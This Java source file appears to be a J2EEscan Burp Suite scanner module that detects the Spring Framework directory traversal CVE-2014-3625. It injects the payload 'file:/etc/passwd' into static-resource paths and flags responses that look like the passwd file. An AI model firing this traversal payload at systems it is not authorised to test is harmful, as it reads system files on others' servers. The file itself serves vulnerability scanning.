package burp.j2ee.issues.impl;

import static burp.HTTPMatcher.isEtcPasswdFile;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 *
 * Pivotal Spring Traversal issue CVE 2014-3625
 *
 * Directory traversal vulnerability in Pivotal Spring Framework 3.0.4 through
 * 3.2.x before 3.2.12, 4.0.x before 4.0.8, and 4.1.x before 4.1.2 allows remote
 * attackers to read arbitrary files via unspecified vectors, related to static
 * resource handling.
 *
 * A not common `mvc:resources` tag configuration is needed to trigger the
 * vulnerability
 *
 *
 * Credits: Special thanks to @Caligin35
 *
 *
 */
public class PivotalSpringTraversalCVE20143625 implements IModule {

    private static final String TITLE = "Pivotal Spring Traversal CVE 2014-3625";
    private static final String DESCRIPTION = "J2EEscan identified a Directory Traversal vulnerability due "
            + "to an outdated Spring library.<br /><br />"
            + "<b>References</b><br />"
            + "http://pivotal.io/security/cve-2014-3625<br />"
            + "https://jira.spring.io/browse/SPR-12354";

    private static final String REMEDY = "Change the <i>mvc:resources</i> tag configuration and update the spring library";

    private static final String INJ = "file:/etc/passwd";

    private static final List<String> staticURLFolders = Arrays.asList(
            "/resources/",
            "/files/",
            "/upload/",
            "/static/",
            "/content/",
            "/html/",
            "/deploy/"
    );

    private PrintWriter stderr;

    /**
     * 
     * Mutator to modify static URI path with the Injection to trigger Traversal issue
     * 
     * GET /spring-css/resources/css/main.css HTTP/1.1 
     * Host: localhost:8084
     * Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate 
     * Referer:http://localhost:8084/spring-css/ 
     * Cookie: JSESSIONID=1C4FD6278C5D1F6448430219B83213C1 
     * Connection: close 
     */
    private String mutator(String httpRequest, String staticResourceFolder, String payload) {
        return httpRequest.replaceFirst(staticResourceFolder + ".* ", payload + " ");
    }

    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        stderr = new PrintWriter(callbacks.getStderr(), true);

        List<IScanIssue> issues = new ArrayList<>();
        IExtensionHelpers helpers = callbacks.getHelpers();

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        // Skip not GET requests
        if (!reqInfo.getMethod().equals("GET")) {
            return issues;
        }

        URL url = reqInfo.getUrl();

        String currentPath = url.getPath();

        for (String staticResourceFolder : staticURLFolders) {

            if (currentPath.contains(staticResourceFolder)) {

                byte[] rawrequest = baseRequestResponse.getRequest();
                String HTTPRequest = callbacks.getHelpers().bytesToString(rawrequest);

                String mutatedHTTPRequest = mutator(HTTPRequest, staticResourceFolder, staticResourceFolder + INJ);

                stderr.println(mutatedHTTPRequest);
                
                IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                        baseRequestResponse.getHttpService(),
                        callbacks.getHelpers().stringToBytes(mutatedHTTPRequest));

                if (isEtcPasswdFile(checkRequestResponse.getResponse(), helpers)) {
                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            checkRequestResponse,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Certain
                    ));
                }

            }
        }

        return issues;

    }
}
